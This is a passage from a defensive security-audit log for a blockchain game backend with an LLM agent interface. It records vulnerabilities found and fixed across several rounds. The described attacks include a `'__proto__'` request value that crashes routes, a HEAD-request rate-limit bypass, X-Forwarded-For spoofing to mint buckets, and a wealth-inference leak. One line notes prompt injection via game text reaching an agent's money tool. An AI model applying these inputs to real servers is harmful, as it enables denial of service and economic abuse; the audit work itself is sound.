- **worker F1/F4/F5** — the `fundReserve` crash-seam (conservative-direction, caught by nightly
  `runVigInvariants` + manual `mod/reserve/fund`), the monolithic season txn (availability/scale-only, alpha
  population small), the single-worker convoy-spawn TOCTOU (known self-correcting, the world-raid precedent).
- **static MED — no migration path** (already flagged in CLAUDE.md; fresh-DB alpha unaffected).
- **law.js flip-notify names the informant to the victim** — BY DESIGN (the informant-collapse counterplay
  requires the mark to know whom to hunt; the streets feed stays anonymous). Confirmed intent, no change.

**Round 14 verdict: 3 MED (worker tick re-entrancy, watcher poison-log DoS, WS query-token credential) +
3 LOW (backup perms, mixed-clock fire gate, weak-seed floor) fixed/hardened; FNV→HMAC + pg-detail redaction
flagged for sign-off. §10.4 untouched. Suite 33/33 + sim drift-0.**

---

## Round 15 — idempotency/replay · wallet/SIWE/auth · numeric precision · two-party lock order
Four fresh high-yield lenses. Every finding re-verified vs source before any fix; a regression or a
consistency guard per behavioural change. **No CRITICAL/HIGH. No §10.4 drift.** Suite 33/33 + sim drift-0.

- **Boxing estate-cancel escrow race (lock-order MED — FIXED).** `cancelBout` (via the estate hook
  `cancelMainEventsAtDeath`) READ the bet set and refunded it, then only locked the bout row at the very
  end (`UPDATE … status='cancelled'`). The escrow funders are UNLOCKED third-party spectators the estate
  never locks, so a `placeBoutBet` landing between the bet-read and the status flip was MISSED by the
  refund loop yet the bout was then cancelled → that bet's `boxing:bet` escrow is never refunded (resolve
  never runs on a cancelled bout) and never paid = `boxing bet escrow` §10.4 drift + burned spectator
  cash. Invisible on pg-mem (no FOR UPDATE blocking), real on Postgres. Fix: lock the bout row `FOR UPDATE`
  + re-read status at the TOP of `cancelBout` (re-entrant/no-op on the resolve path that already holds it;
  idempotent — bail if no longer `'booked'`). The existing death-cancel test covers behavior-preservation.
  Contrast that proved the gap specific: every other estate escrow hook (`voidListingsAtDeath`,
  `burnBidsAtDeath`, `voidLoansAtDeath`) already locks its rows first; boxing was unique in that the funder
  is an unlocked third party. `src/boxing.js`.
- **Idempotency committed-but-unstored double-execute (idempotency LOW — FIXED).** The worker's 24h prune
  deleted `status=0` reservations — but a status=0 row is ambiguous between "handler never committed"
  (safe) and "handler COMMITTED value but the onSend store `UPDATE` never landed" (a crash, or the
  swallowed `.catch(()=>{})` on the store). Reclaiming the LATTER at 24h let a >24h same-key retry
  re-execute the committed action = double-spend (not attacker-triggerable — needs a crash/DB-blip between
  COMMIT and store AND a client retrying the same key >24h later). Fix: two prune horizons — completed rows
  (status<>0, the replay window) at 24h; orphan reservations (status=0) at 7 DAYS, so that key keeps
  409'ing long past any real retry while a genuinely-dead reservation is still eventually reclaimed. Also
  surfaced the swallowed store-UPDATE failure (log instead of silent) so the committed-but-unstored seam is
  observable. Regression: the two-horizon prune SQL keeps completed<24h + orphan<7d, prunes the rest.
  `src/worker.js` + `src/server.js` + `test/security.js`.
- **Mod fund-route finite guard (numeric L1 — HARDENED).** `fundReserve`/`fundBondTranche` guarded `>0`
  but not `Number.isFinite`, so `Infinity` set `funded_omr`/`capacity_omr` to Infinity. Mod-gated +
  out-of-band chain bucket (not §10.4), but parity with the player-facing finite guards (vanity/swap/bank)
  is a one-liner. `src/chain.js` (+ the `bonds.js` twin flagged; same trivial guard).

**Lenses that came back CLEAN (confirmed, no new action):**
- **Wallet / SIWE / auth** — the SIWE nonce is single-use + account-bound (a victim never signs an
  attacker's accountId → no cross-account binding), Privy enforces aud/iss/alg-ES256/exp/kid (no
  keys[0] fallback), guest-upgrade + identity-uniqueness races converge, pay-before-link reconcile is
  exactly-once + case-insensitive, withdraw only ever moves the caller's own $OMR. The one residual —
  `X_TRUST_USER_TOKEN` confused-deputy — is already gated default-off + documented (the known
  AUDIT-full-system-v2 E-H1). SIWE-challenge-not-consumed-on-failed-verify is non-exploitable hygiene.
- **Numeric precision / sign / overflow** — no value-creation/destruction bug. Rake/PvP splits reconcile
  (`winner+rake` exact, the burned half leaves the tracked set), parimutuel uses last-gets-remainder,
  the AMM preserves k exactly, loot spans cash+bank as one balanced pair, bank-interest ledgers the exact
  written float, and sign/finite guards are present at every client boundary (swap/bank/portfolio/vanity/
  auction/market/loans/casino gateBet/withdraw/stake, mod:confiscate clamped).
- **Idempotency core** — reserve-before-execute is atomic, only 2xx is stored, the response is body-bound
  (422 on key-reuse-different-body), and EVERY post-commit hook (maybeSpark/Qualify/GrandReferral,
  view render, gangs-leave/kick socket close, pass-claim stipend) is try/caught non-fatal on BOTH
  wrappers — no post-commit throw can release a key and re-run a committed action. Casino book, chain
  withdraw, fees mint/reroll, and the WS gateway (no message handler) all confirmed guarded.

**FLAGGED (not patched — ground rule #1 / accepted / cosmetic):** the FNV-mod-1000 money-draw hash + weak
seed (R14 F1b, HMAC swap is a mechanic surface — the seed-entropy floor closes the practical risk); the
`port.js` two-boat `IN(...)` lock relying on scan-order not param-sort (safe today, single-statement over
the same two rows — a future two-boat sequential-lock path would need the sorted-`FOR UPDATE` idiom); the
accepted/wrapped 40P01s (bounty repost-vs-sweep B-H2, auction cross-lot cross-refund, co-op leader-vs-PvP);
territory/business emission-neutrality being an approximate (not identity) economic bound (§10.4-exact
regardless); the speakeasy back-room table variance faucet (§10.4-clean).

**Round 15 verdict: 1 MED (boxing estate-cancel escrow race) + 1 LOW (idempotency committed-but-unstored
double-execute) fixed + 1 finite-guard hardening; wallet/auth, numeric, and idempotency-core lenses
confirmed CLEAN. §10.4 untouched. Suite 33/33 + sim drift-0.**

---

## Round 16 — Solidity contracts · DoS/resource-exhaustion · state-machine/escrow abuse · input-validation/injection
Four fresh lenses. Every finding re-verified vs source; a regression per behavioural fix. **No
CRITICAL/HIGH. No §10.4 drift.** Suite 33/33 + sim drift-0.

- **Prototype-key crash-500 ×2 (input-validation LOW — FIXED).** Two catalog resolvers used direct
  object-indexing, so a `'__proto__'`/`'constructor'`/`'hasOwnProperty'` value returned `Object.prototype`
  (truthy) and slipped the enum gate: **(1)** `stableKindOf` (`POST /v1/stable/buy {kind:'__proto__'}`) →
  bypasses the `!k` gate → NaN cost/stats → the `INT NOT NULL` racer INSERT rejects NaN → 500 + rollback
  (DoS, no corruption — the cash mutation is undone); **(2)** `ART_CATALOGS[req.params.kind]` on the
  KEYLESS PUBLIC `GET /v1/art/:kind/:id` → `Object.prototype` passes the `list &&` guard → `.find` is
  undefined → uncaught TypeError 500. Both fixed with the codebase's own `Object.prototype.hasOwnProperty.call`
  pattern (the `decorStyleOf`/`landmarkOf` precedent — `stableKindOf` was the only rules.js resolver still
  object-indexing). Regression: prototype-key `kind` values return a clean `'kind'` error, not a 500.
  `src/rules.js` + `src/server.js` + `test/stable.js`.
- **Telemetry seq-scan (DoS MED — FIXED).** `funnelStats` filters `telemetry` by `event`
  (`broadcast_share`/`first_week_step`) with no index, so the admin dashboard's 15s poll seq-scanned the
  whole (fastest-growing) telemetry table twice each cycle. Added `ix_telemetry_event`. `schema.sql`.

**Lenses that came back CLEAN (confirmed):**
- **Solidity contracts** (all six) — no CRITICAL/HIGH/MED. The five load-bearing invariants hold on manual
  review: no-mint / pre-funded-transfer-only with the tranche cap enforced BEFORE commit
  (`committedOMR+payout ≤ balanceOf`), EIP-712 domain + `VOUCHER_TYPEHASH` field/type order EXACT parity
  with `src/chain.js` on the live voucher path (+ chainId/verifyingContract binding → no cross-chain/instance
  replay, high-`s` rejected, MAX_TTL backstops on both contracts), CEI + `nonReentrant` on every
  value-moving external (the ERC-1155 mint callback inert — receiver isn't the minter), Safe-owned-from-deploy
  with no owner-mint + a fail-closed gear cap surviving a minter swap, and vesting/rounding that floors
  down (can't exceed/bypass the cap). Residuals all LOW/accepted-by-design Safe-trust (VoucherClaim.sweep
  lacks OmertaBond's committed-backing guard; reverting-recipient recoverable DoS; APY retroactivity;
  daily-cap contention) + deploy-checklist notes (gearId↔MARKET positional binding must stay append-only;
  no OmertaBond deploy script). `forge test` remains the standing pre-mainnet gate (Foundry egress-blocked).
- **State-machine / escrow-lifecycle / cooldown** — no CRITICAL/HIGH/MED. The boxing bet-escrow fix's
  siblings are ALL guarded: every terminal transition (casino futurity/tournament/GP/stakes, bounty,
  market, loans, auction, convoy-insurance, heist/pen-break) re-checks its status column UNDER the row
  `FOR UPDATE` lock, not just at read; cooldowns are set win-or-lose on the contested row (not the actor,
  no re-entry reset); the estate wipe-list split (den house-book games wiped, peer-money escrows KEPT for
  the resolver) is correct. One LOW self-healing TOCTOU noted (`postBounty` on a dying target — a live pot
  on a dead mark, refunded in full by the TTL sweep; never a §10.4 drift).
- **DoS core surfaces bounded** — the opportunity board + every discrete board are SQL-`LIMIT`ed (contracts
  100 / market 100 / convoys 30 / loans 50) so attacker-posted rows can't inflate them; the WS per-account
  cap (8, TOCTOU-closed) + heartbeat + bus cleanup; the ratelimit-bucket TTL sweep; the cardpng cache
  (256/5min, worker-thread raster — no event-loop block); `runEstate`/`loadOwned` bounded by per-account
  caps; no ReDoS (linear regexes + length clips + 1MB bodyLimit).

**FLAGGED for founder sign-off (NOT patched — operational/architectural/accepted, ground rule #1):**
- **DoS #1 (HIGH-rated availability, architectural):** `withCharacter`-on-GET takes a write `FOR UPDATE`
  on the caller's own row + ~24 queries, so ~20 concurrent `GET /v1/me` from ONE account block on that row
  while each holds a pool connection (`PG_POOL_MAX` 20) → transient server-wide pool starvation; the read
  burst (60) exceeds the pool. Recommended (a founder call — touches the hottest path): size the read
  burst ≤ pool, a per-account in-flight cap (the `wsReserving` pattern), or a read-only no-lock GET fast
  path. Not patched autonomously — a wrong change here breaks every authed request.
- **DoS #3/#4/#5:** the admin dashboard's 15s poll of the full §10.4 sweep over `transactions`/`rng_audit`
  (mod-gated, scales with table growth — cache/lengthen the interval); five leaderboards
  (portfolio/family-portfolio/nightlife/stable/boxing) that load all rows + slice in JS (the aggregating
  ones can't take a naive SQL LIMIT); missing indexes on the `account_persistent` leaderboard columns
  (LOW — already SQL-`LIMIT`ed, small table); and a per-account/day dedup on `POST /v1/broadcast/shared`.
- **Contract Safe-trust items** (VoucherClaim.sweep guard, recipient-DoS, APY retroactivity) — a Solidity
  change gated on `forge test`, which can't run here; all accepted-by-design (Safe = root of trust).
- **Name-uniqueness case mismatch** — DOCUMENTED/accepted (schema.sql:1536: uniqueness is case-sensitive,
  resolution uses `lower(name)` + `ix_char_lower_name`), so "Vito"/"vito" can coexist + resolve ambiguously.
  A deliberate design choice, not reversed.

**Round 16 verdict: 2 LOW prototype-key crash-500s + 1 MED telemetry seq-scan fixed; Solidity,
state-machine/escrow, and DoS-core lenses confirmed CLEAN; the pool-starvation availability item + the
dashboard/leaderboard scaling items flagged for a founder architectural call. §10.4 untouched. Suite
33/33 + sim drift-0.**

---

## Round 17 — cross-system value-chains · accrual/timing/clock · authorization matrix · websocket/bus/notify
Four fresh lenses aimed at emergent (multi-system) risk. Every finding re-verified vs source. **No
CRITICAL/HIGH. No §10.4 drift.** Suite 33/33 + sim drift-0.

- **`busted` streets wealth leak (websocket MED — FIXED).** `resolveBust` emitted `{type:'busted', who,
  forfeited: total}` to the server-wide `streets` feed, and `total = FORFEIT_RATE × (pocket+bank)` with
  `FORFEIT_RATE` a PUBLIC constant — so any connected socket could invert `liquid = forfeited/FORFEIT_RATE`
  to the victim's EXACT cash+bank for free, a no-cost precise-wealth oracle undercutting the paid Wire
  dossier (which BANDS wealth) + the anti-precise-kill-EV rule every other wealth surface respects
  (convoy emits a value band; kill/jump emit names only). Fix: the streets emit now carries only THAT a
  bust happened (`{type:'busted', who}`) — the exact figure stays on the victim's own `me:` notify + the
  private return/telemetry. `src/law.js`. (No test read the streets field; the response body is unchanged.)

**Lenses that came back CLEAN (confirmed):**
- **Cross-system economic exploit chains** — no unbounded value creation, no NEW Sybil-scalable +EV rail
  beyond the accepted set. Every consensual A→B cash transfer is taxed 2–5% (market/exchange, speakeasy
  round/buyout, bodyguard, loan repay/collect/paper, all casino/boxing/race/stable PvP); the only untaxed
  A→B is the already-accepted directed loan (`MAX_ACTIVE=1`). All loot rates <100% → self-funded rings are
  −EV; parimutuels net −rake to a controlling ring (profit needs outside money); convoy insurance is
  underwriting-capped ≤0/account; shakedown/rival-raid clock-advance is emission-neutral; the hard
  extraction bound is the full-reserve withdrawal queue (extraction ≤ inflow), not any in-game cap.
- **Lazy accrual / timing / clock** — no double-accrual, no backward-clock mint, no clock-advance
  arithmetic error, no worker-vs-read double-count. The emission-neutral clock-advance math is exact at
  the cap boundary (verified algebra), `max(0,dt)` clamps are present at every dt site, collects reset
  the clock to `now()` (never `now−cap`), every collect is atomic under a serializing lock, and the
  uncapped staking-rewards accrual is §10.4-safe (rewards excluded from `omrBuckets`; paid pool-bounded).
- **Websocket / bus / notifications** — channel auth sound (`me:` bound to the authed live char, `gang:`
  from server-side current membership, no `socket.on('message')` so no client-chosen channel, R9
  leave/kick drop intact), no notification injection (targets server-derived, payloads escaped), the `me:`
  feed isn't a free hunt/bounty oracle (startSearch silent → the Wire tap is still the paid way to learn
  you're hunted), shared-channel payloads banded (convoy valueBand, anon-contract family omitted), and the
  keyless card/profile routes expose only the banded dossier (never exact wealth, `esc()`'d, clipped).

**FLAGGED for founder sign-off (NOT patched — balance/calibration/documented, ground rule #1):**
- **Cumulative faucet stacking (cross-system MED):** each "one new faucet" was sim-measured in ISOLATION
  ("maxed 3-stable", "top-tier speakeasy"), but a fully-built endgame whale runs territory + up to 5
  businesses + port + a 3-fighter boxing stable + a 4-racer stable + street-race purses + world raids +
  convoys + casino rakeback in parallel — the sim never SUMS them, so aggregate endgame $/day has no
  measured ceiling. Recommend a sim probe summing a fully-built character's realized $/day vs the
  Risk-to-Earn target before production. §10.4-clean (every faucet ledgered) — a calibration gap, not a leak.
- **Port fence-timing (cross-system LOW-MED):** `fenceMultOf` is deterministic/public (0.85–1.25) and the
  supply cap gates SOURCING not warehousing/fencing, so a savvy player accumulates then dumps on the 1.25
  peak day → ~15–25% realized uplift over the sim's auto-fence baseline. Refines the already-flagged port
  sign-off item; counterweight is the 50% contraband loot on a fire-kill.
- **Crew sales not daily-bucketed (accrual LOW-MED):** offline kitchen crew sales are metered only by the
  per-touch 8h cap, NOT the refilling `racket_credit_ms` token bucket the D2b fix gave rackets — so pinging
  any `withCharacter` action every <8h realizes ~24h/day of sell-time vs the bucketed racket rate. NOT a
  §10.4 mint (bounded by the finite stash, ledgered `crew:sales`, heat-self-limiting) — a balance-parity
  call: add a `crew_credit_ms` bucket IF the sim signed the kitchen loop at 8–12h/day. Founder dial.
- **`upgradeRacket` Bureau-raid dodge (accrual LOW):** ALREADY documented/flagged — `upgradeRacket` banks
  pending without the `resolveTerritoryRaid` roll that `upgradeBusiness`/`upgradeSpeakeasy` do. Bounded
  (scrutiny not cleared → a later collect still rolls it). The `upgradeSpeakeasy` parity fix is the dial;
  left for founder sign-off (touches the signed raid balance).
- **Port haul exact-value streets emit (websocket LOW):** `port_landing`/`port_fence` ship an exact haul
  value (vs convoy's band) — but it's realized-income theater at arrival (no ambush possible), like the
  accepted casino highroller stake. Band it for convoy parity if desired.

**Round 17 verdict (3 of 4 lenses): 1 MED (busted streets exact-wealth leak) fixed; cross-system,
accrual/timing, and websocket lenses confirmed CLEAN; faucet-stacking + port-timing + crew-bucket +
upgradeRacket flagged for founder calibration. §10.4 untouched. Suite 33/33 + sim drift-0. (Authorization-
matrix lens pending — addendum next.)**

### Round 17 addendum — authorization matrix (aafa021b)
**CLEAN — no CRITICAL/HIGH/MED authorization bypass.** Every mutating action re-derives the actor from
the JWT (`req.user.sub` → account → *alive* character under `FOR UPDATE`) and re-verifies ownership/rank/
membership server-side against THAT actor; URL `:id` params are always asset/target references, never
trusted as the actor or as proof of ownership. Verified: the mod perimeter (all 27 `/v1/mod/*` routes carry
`preHandler: modAuth`; `modKeyOk` is a length-guarded `crypto.timingSafeEqual`; `ALLOW_MOD_REAL_REVENUE`
double-gates fabricated reserve); every asset-ownership gate (garage/business/boats/fighters/racers/market/
loans/speakeasy/guns/blackjack all `WHERE …=actor` or `h.owned.*.find`); gang rank gates (`canCommand` from
the actor's locked role, boss-ONLY commission veto vs boss/underboss powers matching spec, every command on
`h.owned.gangId` never a URL gang id); self/other + two-party self-guards (`withTwoCharacters` `self`,
postBounty self-target + self-hitman, heist own-front, crew leader re-verify, wire self-gates); status gates
(banned refused at the door, agent throttle, referral/social/leaderboard agent exclusions where payouts
exist). Two LOW/informational, both documented-accepted non-findings: inconsistent agent exclusion on the
PAYOUT-FREE status leaderboards (wire/world/frontier/territory/portfolio/feud/foundation — accepted, matches
the recorded design), and the bounded/non-escalating `gang_members` role-read TOCTOU (a demote overlapping a
loadOwned permits at most one stale-privileged command, treasury can't go negative — accepted across prior
audits). No files modified.

**Round 17 FINAL: 1 MED (busted streets exact-wealth leak) fixed; all four lenses (cross-system value
chains, accrual/timing, websocket/bus, authorization matrix) confirmed CLEAN of CRITICAL/HIGH; calibration
items flagged for founder. §10.4 untouched. Suite 33/33 + sim drift-0.**

---

## Round 18 — client-side security · runEstate death-path · newest-modules kitchen-sink
Three focused lenses on the freshest/highest-complexity surfaces. Every finding re-verified vs source; a
regression on the one behavioural gate. **No CRITICAL/HIGH. No §10.4 drift.** Suite 33/33 + sim drift-0.

- **Boxing manager-legend Sybil floor (kitchen-sink LOW/MED — FIXED).** `fightBout` + `resolveMainEvent`
  bumped the account-level `boxing_wins` legend (the survives-death leaderboard) with NO loser-level floor,
  unlike its two twins — races (`WHEEL_MIN_LVL` 10) and stable (`LEGEND_MIN_LVL` 10) both gate their legend
  bumps as the documented anti-Sybil fix (WANTED_MIN_LVL/npcHit-rookie-floor precedent). A ring of fresh-alt
  managers could feed a main account `boxing_wins` by losing bouts. Added `BOXING.LEGEND_MIN_LVL` (10) and
  gated both bumps on `levelOf(loser.respect)` (fightBout has the loser in scope; resolveMainEvent fetches
  the loser char's respect — both chars already locked). Pure STATUS, no §10.4/gameplay power. Regression:
  a win over a level-9 loser banks NO legend. `src/rules.js` + `src/boxing.js` + `test/boxing.js`.
- **Port collect/fence jail-hosp gate parity (kitchen-sink LOW — FIXED).** `collectRun` gated only
  safehouse+district (not jailed/hospitalized) while `launchRun` + every other port verb gate all three;
  `fenceContraband` gated jail but not hospitalized. A captain in lockup/hospital could work a dockside
  landing. Added the missing gates for parity (not §10.4 — the faucet is bounded regardless). `src/port.js`.
- **Port `berths` absolute INT write (kitchen-sink INFO — FIXED).** `berths = berths + 1` is the pg-mem
  INT-arithmetic quirk (production-safe on real Postgres, but pg-mem mis-evaluates a second rent); switched
  to an absolute JS-computed write (the racer/fighter-record convention). `src/port.js`.
- **Estate cb/ammo escrow lock + missions_done wipe (death-path INFO — HARDENED).** The Exchange cb/ammo
  `death:escrow` burn did `SUM(qty) FROM listings … then DELETE` WITHOUT an explicit `FOR UPDATE`, the lone
  estate escrow-read without a row lock (currently safe — incidental to the seller char lock the estate
  holds — but the bounty-pot FOR-UPDATE-before-SUM precedent makes it robust to any future listings path);
  added the lock. Also added `missions_done` to the estate wipe loop (the one character-scoped table that
  orphaned — harmless, but closes the wipe-every-character-table hygiene exception). `src/social.js`.

**Lenses that came back CLEAN (confirmed):**
- **Client-side security** (`public/*.html`) — NO live stored/DOM XSS. Every `innerHTML` sink traced: each
  player field is neutralized server-side (`cleanText` strips `<>"`, the ASCII name whitelist blocks tag/
  attribute breakout, crest color is `#rrggbb`, plate is alnum), `describe()`/`bragText()` output only
  reaches `textContent` sinks, the admin dashboard `esc()`s player data + telemetry, and credentials are
  handled right (WS bearer off-URL via subprotocol, mod-key header-only, ref capture length-clamped +
  URL-encoded). Two LOW/INFO defense-in-depth residuals (client XSS safety is INHERITED from server
  validation not enforced at the sink; JWT-in-localStorage) — flagged for a founder architectural call, NOT
  a ~150-sink client refactor churned autonomously for a non-bug.
- **runEstate death-path** — exceptionally clean. The wipe/survive split is correct (den forfeitures
  §10.4-clean via the den-profit identity; peer-money escrows — boxing/poker/GP/stakes/futurity/track
  entries+bets — correctly KEPT so the worker resolver burns dead participants via `*:death`; account
  legends + portfolios/estates/auctions/landmarks survive); every escrow refunds XOR burns exactly once
  with the killer threaded in-memory (refundPot/killerCh, no persist-clobber); loot-vs-burn is conserved
  (loot subtracted from the victim before the estate burns the remainder, three disjoint money sources);
  heir freshness holds (`alive=false` before the heir INSERT, sheds street marks, inherits account marks);
  killer semantics correct per path (fire loots+rep, npcHit/shank no loot, mod-kill/hunt killer-less); and
  the estate-vs-sweep double-resolution is closed (FOR-UPDATE-before-SUM on bounties + now the cb/ammo
  listings). INFO-2 (missions_done orphan) fixed above.

**Round 18 verdict: 1 LOW/MED (boxing legend Sybil floor) + 2 LOW (port gate parity, berths INT write) +
2 INFO hardening (estate cb/ammo escrow lock, missions_done wipe) fixed; client-side security + the
runEstate death-path confirmed CLEAN of live vulnerabilities. Client XSS-at-sink hardening + JWT-storage
flagged for a founder architectural call. §10.4 untouched. Suite 33/33 + sim drift-0.**

---

## Round 19 — rate-limit correctness/bypass · chain reserve/queue accounting · worker sweep-sequence
Three last-distinct technical lenses (the chain withdrawal queue is the highest-value real-money target).
Every finding re-verified vs source; regressions on the two behavioural fixes. **No CRITICAL/HIGH. No §10.4
drift.** Suite 33/33 + sim drift-0.

- **HEAD-method throttle bypass (rate-limit MED-HIGH — FIXED).** Fastify 5 auto-generates a HEAD route per
  GET (`exposeHeadRoutes` default on) that runs the SAME handler + `auth` preHandler, but every throttle
  branch gated on `req.method === 'GET'` — so `HEAD /v1/me` ran `withCharacter` (FOR UPDATE + a held pool
  connection) UNTHROTTLED, reopening BOTH the R10 pool-pinning defense and the R1 agent-1/3s-cadence defense.
  Fixed: the agent-GET throttle + the read limiter + the public per-IP limiter now treat HEAD as a read
  (`GET || HEAD`) — behavior-preserving (HEAD still works for infra/health-checks, just throttled like GET).
  `src/server.js`.
- **Keyless heavy GET routes unthrottled (rate-limit MED — FIXED).** `/v1/art` (SVG-render per hit) and
  `/v1/landmarks` (full-table scan) are keyless (no `auth`), so an unauthenticated caller sent no token →
  the `/v1` read limiter early-returned → they were throttled by NOTHING (the public per-IP allowlist was
  only `/card`,`/u`,`/v1/u`). Added both to the public allowlist → the unauthenticated origin-DoS is bounded.
  `src/server.js`.
- **`markClaimed` queued-voucher strand (chain LOW — FIXED).** `markClaimed` guarded by EXCLUSION
  (`status<>'expired' AND <>'cancelled'`) but not `status='queued'` — so the mod `/reserve/claimed` route
  could, on an operator nonce typo, flip a QUEUED (never-signed) voucher to `'claimed'`, PERMANENTLY
  stranding its burned $OMR (drainQueue + cancel both require `status='queued'`; never signed → unclaimable
  on-chain) + falsely counting it in `committedOutstanding`. A real `Claimed` event only ever names a
  SIGNED voucher, so restricted the guard to the positive `status='signed'` (watcher-neutral, idempotent —
  a re-claim finds `status='claimed'≠'signed'`, and the double-resolution detector still fires on
  expired/cancelled). Regression: `markClaimed` no-ops on a queued voucher, which stays drainable.
  `src/chain.js` + `test/chain.js`.
- **Watcher poison-isolation symmetry (worker LOW — HARDENED).** `syncClaimedEvents`/`syncTradeFees` lacked
  the R14 per-log `isolate()` wrapper `syncFeeEvents` got — a deterministic-poison log would freeze the
  cursor instead of skipping. Little live surface (`markClaimed` takes a nonce; the cursor advances only
  after the window's loop), but closed the asymmetry. `src/watcher.js`.

**Lenses that came back CLEAN (confirmed):**
- **Chain reserve/withdrawal-queue accounting** — no live over-sign / peg-break / double-spend / reserve
  double-free through any automated path. `requestWithdraw`'s full-reserve gate has NO TOCTOU (the
  `chain_reserve FOR UPDATE` mutex serializes the read-decide-write; `committedOutstanding` = signed OR
  claimed is the right gate quantity, committed-ever ≤ funded); nonce allocation is atomic + collision-free;
  `drainQueue` can't double/over-sign (whole-loop reserve lock, per-voucher re-check, fresh deadline);
  `markClaimed` doesn't free room + is idempotent; `reclaimExpiredVouchers` is fail-closed (no reader → never
  refund; `usedNonce` on-chain consult under lock; deadline-past property closes the reclaim-vs-claim race);
  `cancelQueuedWithdraw` can't refund a just-signed voucher; lock order acyclic; §10.4 net-0 through every
  transition. Two residuals flagged below.
- **Worker sweep-sequence** — every value-moving sweep follows characters-sorted→object→singleton, re-checks
  a status/`_at` flag under the lock, per-item idempotent txn; within-tick ordering correct (buyback zeroes
  the pool before later credits accrue for the next cycle; season prize snapshotted before the reset, granted
  under the winner's char lock; despawn-before-spawn; materialize-vs-resolve disjoint by day); worker-vs-player
  races closed (`huntWanted` re-checks `alive`+`isWanted` under lock → no double-estate; `sweepLaw` re-checks
  `indicted_at`; every escrow sweep locks chars-before-pot). Partial-tick failure resumes at k+1 via status
  filters. The re-entrancy guard + two-horizon prune (R14/R15) intact.
- **Rate-limit core** — every mutating route is guarded (284 `/v1` POST/DELETE through the human/agent bucket,
  auth per-IP, mod key-only); the agent throttle is DB-driven (defeats a pre-flag token); the swap bucket is
  taken after the main (strictly stricter, no cheaper fall-through); 429 releases no idempotency key + a
  replay consumes a token; token-bucket math is sound (burst-capped, backward-clock fail-closed, eviction-
  refill reasoning holds); Redis `INCR` is atomic (no double-grant race).

**FLAGGED for founder sign-off (NOT patched — deploy-posture/ops/accepted, ground rule #1):**
- **`trustProxy` dichotomy (rate-limit MED, deploy):** OFF (default) behind a proxy collapses all signups to
  one global `auth:` bucket (a spammer locks out all new accounts); ON without an XFF-scrubbing edge lets a
  spoofed `X-Forwarded-For` mint unlimited buckets (Sybil). A deploy-doc hard requirement (edge overwrites
  XFF, origin unreachable except through it) + optionally a per-IP-AND-per-invite mint bound.
- **`funded_omr ≤ on-chain contract balance` (chain MED, ops):** enforced only by the Vig path; the legacy
  `POST /v1/mod/reserve/fund` can bump `funded_omr` with no matching on-chain transfer → signed-but-
  unclaimable vouchers. Caught POST-HOC by the nightly `runVigInvariants` "reserve fully backed" alarm — a
  documented ops-discipline posture, not a live code defect (mod-gated).
- **Redis fixed-window boundary doubling (rate-limit LOW):** ~2× burst at a window edge (swap 12/min vs 6);
  a token-bucket Lua script would remove it (Redis-mode only, can't test here). The non-atomic INCR+PEXPIRE
  strands a TTL-less key on crash (fails CLOSED — availability nit).
- **Worker single-instance (LOW, deploy):** `spawnNpcConvoys` reads the NPC count unlocked → a horizontally-
  scaled worker double-spawns (the accepted world-raid-precedent single-worker posture); the loans→huntWanted
  same-tick coupling (a fresh welsher hunted the tick they default — WANTED carries no grace contract);
  post-commit `fundReserve` under-funding (caught by nightly vig invariants).

**Round 19 verdict: 2 rate-limit fixes (HEAD-throttle bypass MED-HIGH, keyless-GET DoS MED) + 1 chain fix
(markClaimed queued-strand LOW) + 1 watcher hardening; chain reserve/queue accounting, worker sweep-sequence,
and rate-limit core confirmed CLEAN of live exploits; trustProxy/reserve-backing/Redis/single-worker flagged
for deploy-posture sign-off. §10.4 untouched. Suite 33/33 + sim drift-0.**

---

## Round 20 — agent/MCP surface · supply-chain/secrets/config · malicious-player attack-chain
Three final-distinct lenses. Every finding re-verified vs source; a regression on the fail-open guard. **No
CRITICAL/HIGH. No §10.4 drift.** Suite 33/33 + sim drift-0.

- **MCP idempotency retry-safety (agent MED — FIXED).** `omerta-mcp/index.js` minted a fresh
  `randomUUID()` idempotency key PER call, so a downstream-LLM retry of a money mutation (re-calling
  `omerta_request` with the same `{method,path,body}` after an ambiguous/timed-out result) sent a NEW key →
  the server executed it as a fresh action = accidental double withdraw/swap — contradicting the retry-safety
  the code comment + AGENTS.md promise. Fixed: the key is now a DETERMINISTIC `sha256(method path body)` so a
  logical retry replays the stored response (the safe default for money moves). `omerta-mcp/index.js`.
- **MCP redirect-follow (agent LOW — HARDENED).** The origin hard-assert validated only the initial URL;
  `fetch` followed 3xx redirects, so an on-origin open redirect would be followed off-origin (bounded —
  undici strips Authorization cross-origin, and no on-origin open redirect exists). Added `redirect: 'manual'`.
  `omerta-mcp/index.js`.
- **`SOCIAL_VERIFY_MODE=trust` fail-open faucet (supply-chain MED — FIXED).** `socialRewardsLive()` returned
  true for any mode `!== 'off'`, so a production server left on the alpha's honor-system `trust` would pay the
  Spread-the-Word cash faucet to the whole base on ZERO proof — unlike `verify.js`, which THROWS in production
  on `trust`. Mirrored that guard: `socialRewardsLive()` now returns false for `trust` in production
  (fail-closed — a prod server that forgot `SOCIAL_VERIFY_MODE=live` pays nobody), while the alpha keeps
  `trust`. Regression: the guard returns false under `NODE_ENV=production` + `trust`, true otherwise.
  `src/growth.js` + `test/growth.js`.
- **`/admin` clickjacking header (supply-chain LOW — HARDENED).** The mod ops console (holds the mod key in
  sessionStorage, drives confiscate/ban/mint) served no `X-Frame-Options` → framing/clickjacking surface.
  Added `X-Frame-Options: DENY` + `Referrer-Policy: no-referrer` (no CSP — would break its inline scripts).
  `src/server.js`.

**Lenses that came back CLEAN (confirmed):**
- **Agent/MCP surface** — the R13 SSRF fix is robust against 21 bypass payloads (parsed-origin comparison
  defeats the string-concat class entirely); the mod surface is unreachable (`omerta_request` attaches only
  the agent bearer, never `x-mod-key`; `modAuth` rejects `/v1/mod/*`); the OpenAPI excludes the mod surface
  two independent ways (preHandler-name `modAuth` + `/v1/mod/` URL) and never emits the `x-mod-key` scheme;
  the Opportunity Board leaks nothing beyond the individual boards (directed/own-head/anon skipped, convoy
  value-band not manifest, no auction reserve, funders never present); the agent leaderboard is banded; the
  agent-key mint is not an escalation. One design-level residual flagged (prompt-injection: attacker game
  text → MCP tool output + the general money tool — inherent to autonomous-agent-with-tools; charset limit +
  cleanText reduce but don't eliminate).
- **Supply-chain / secrets / config** — NO hardcoded real secret anywhere (only well-known public anvil
  keys in tests); every security control fails CLOSED (JWT_SECRET/MARKET_SEED/MOD_KEY/DATABASE_URL boot
  guards, ALLOW_MOD_REAL_REVENUE/X_TRUST_USER_TOKEN/WS_ALLOW_QUERY_TOKEN/TRUST_PROXY all default-off, the
